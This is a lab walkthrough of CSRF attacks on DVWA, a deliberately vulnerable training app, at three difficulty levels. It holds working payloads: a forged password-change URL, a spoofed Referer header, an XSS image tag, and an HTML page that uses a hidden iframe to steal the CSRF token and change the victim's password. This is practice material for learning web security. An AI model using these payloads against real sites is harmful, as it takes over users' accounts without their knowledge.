#Cross site request forgery(CSRF) - Task is to make the current user change their own password, without them knowing 
#about their actions, using a CSRF attack. 

#Low difficulty - There are no measures against CSRF, thus we can make a malicious URL which can be sent through email or chat
https://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=testpass&password_conf=testpass&Change=Change#

#Medium difficulty - The developer has added a referrer field and allows a request if it's coming from the same domain.
#There are two solutions for this. One is to capture the illegitimate request using ZAP and adding the referrer field as the current domain.
Referer: https://127.0.0.1/dvwa/vulnerabilities/csrf/
#Second solution is to use XSS to make the request while having the same domain.
<img src="/dvwa/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change">

#Hard difficulty - The developer has added a CSRF token making the above approaches unusable. For this, the CSRF token has to be 
#added to the request for it to be executed. Due to Same origin principle, the code also has to be executed on the server side so that 
#it has the correct CSRF token and doesn't give DOMexception due to it being a cross origin object. Then, the script executes and 
#changes the password

<html>
 <body>
  <p>TOTALLY LEGITIMATE AND SAFE WEBSITE </p>
  <iframe id="myFrame" src="http://10.6.66.42/dvwa/vulnerabilities/csrf" style="visibility: hidden;" onload="maliciousPayload()"></iframe>
  <script>
   function maliciousPayload() {
    console.log("start");
    var iframe = document.getElementById("myFrame");
    var doc = iframe.contentDocument  || iframe.contentWindow.document;
    var token = doc.getElementsByName("user_token")[0].value;
const http = new XMLHttpRequest();
    const url = "http://10.6.66.42/dvwa/vulnerabilities/csrf/?password_new=hackerman&password_conf=hackerman&Change=Change&user_token="+token+"#";
    http.open("GET", url);
    http.send();
    console.log("password changed");
   }
  </script>
 </body>
</html>

#The user can be redirected to it's location using the following link: https://127.0.0.1/dvwa/hackable/uploads/index.html
